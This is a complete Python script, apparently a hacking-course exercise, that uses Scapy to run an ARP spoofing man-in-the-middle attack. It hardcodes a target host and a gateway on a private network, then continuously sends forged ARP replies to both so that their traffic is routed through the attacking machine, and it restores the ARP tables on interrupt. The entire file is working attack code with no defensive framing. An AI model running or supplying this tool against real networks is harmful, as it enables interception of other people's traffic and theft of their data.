import scapy.all as scapy
import time
import socket
import sys
import logging

# Disable Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

target_ip = "192.168.29.85"
gateway_ip = "192.168.29.1"

def get_mac(ip):
    try:
        # Create an ARP request directed to the broadcast MAC asking for the IP
        arp_request = scapy.ARP(pdst=ip)
        # Create an Ethernet frame containing the ARP request
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        # Combine the Ethernet frame and the ARP request
        arp_request_broadcast = broadcast/arp_request
        # Send the request and receive the response
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        
        if answered_list:  # Check if we received a response
            return answered_list[0][1].hwsrc
        else:
            print(f"[!] No response from {ip}. Retrying...")
            return None
    except socket.error as e:
        print(f"[!] Socket error while sending ARP request to {ip}: {e}")
        return None
    except Exception as e:
        print(f"[!] Unexpected error while sending ARP request to {ip}: {e}")
        return None


def spoof(target_ip, spoof_ip):
    try:
        target_mac = get_mac(target_ip)
        if target_mac:  # Only send ARP packet if MAC address is found
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            scapy.send(packet, verbose=False)
        else:
            print("[!] Unable to spoof, target MAC not found")
    except Exception as e:
        print(f"[!] Error during spoofing: {e}")


def restore(destination_ip, source_ip):
    try:
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
        
        if destination_mac and source_mac:  # Only send ARP restore packet if MAC addresses are found
            packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
            scapy.send(packet, count=4, verbose=False)
        else:
            print("[!] Unable to restore, MAC addresses not found")
    except Exception as e:
        print(f"[!] Error during restore: {e}")


send_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        send_packets_count += 2
        print("\r[+] Packets sent: " + str(send_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C resetting ARP tables .. please wait  \n")
    try:
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+] ARP tables restored")
    except Exception as e:
        print(f"[!] Error during ARP table restoration: {e}")
    sys.exit(0)
except socket.error as e:
    print(f"[!] Network error occurred: {e}")
    sys.exit(1)
except Exception as e:
    print(f"[!] Unexpected error occurred: {e}")
    sys.exit(1)
